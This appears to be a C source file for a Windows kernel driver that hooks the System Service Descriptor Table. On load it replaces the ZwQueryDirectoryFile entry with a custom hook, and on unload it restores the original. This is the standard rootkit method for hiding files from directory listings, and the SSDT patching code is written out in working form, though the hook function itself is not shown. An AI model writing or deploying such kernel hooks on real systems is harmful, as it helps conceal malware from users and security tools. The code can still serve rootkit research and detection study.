#include "Header.h"

void Unload(PDRIVER_OBJECT pDriverObject) {
	DbgPrint("Unload routine called.\n");

	// Unhook the SSDT.
	*(PULONG)ssdtZwQueryDirectoryFileAddress = originalZwQueryDirectoryFileAddress;

	DbgPrint("ZwQueryDirectoryFile unhooked.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	DbgPrint("Driver Loaded.\n");

	pDriverObject->DriverUnload = Unload;

	ULONG serviceNumber = *((PULONG)ZwQueryDirectoryFile + 1);
	ssdtZwQueryDirectoryFileAddress = (ULONG)KeServiceDescriptorTable->ServiceTableBase + serviceNumber;

	originalZwQueryDirectoryFileAddress = *(PULONG)ssdtZwQueryDirectoryFileAddress;
	fnZwQueryDirectoryFile = (ZwQueryDirectoryFilePtr)originalZwQueryDirectoryFileAddress;

	*(PULONG)ssdtZwQueryDirectoryFileAddress = (ULONG)Hook_ZwQueryDirectoryFile;

	return STATUS_SUCCESS;
}